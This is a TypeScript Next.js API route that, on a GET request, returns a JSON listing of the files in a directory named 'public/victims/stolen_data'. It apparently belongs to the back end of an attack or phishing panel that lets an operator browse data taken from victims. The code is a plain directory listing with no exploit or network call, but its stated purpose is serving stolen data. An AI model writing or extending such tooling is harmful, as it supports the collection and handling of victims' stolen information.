import { createFileDriveHandler } from '@/features/createFileHandler'
import type { NextApiRequest, NextApiResponse } from 'next'
import { ResponseData } from '..'
import { listFilesInDirectory } from '@/features/listFilesInDir'


export default async function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData | string | any>
  ) {
    if(req.method?.toLowerCase() == 'get'){
      const listOfFiles = listFilesInDirectory(`public/victims/stolen_data`)
      if(typeof listOfFiles == 'string')
      return res.status(400).json({error:listOfFiles,status:'FAIL'})

      return res.status(200).json(listFilesInDirectory(`public/victims/stolen_data`))
    }
}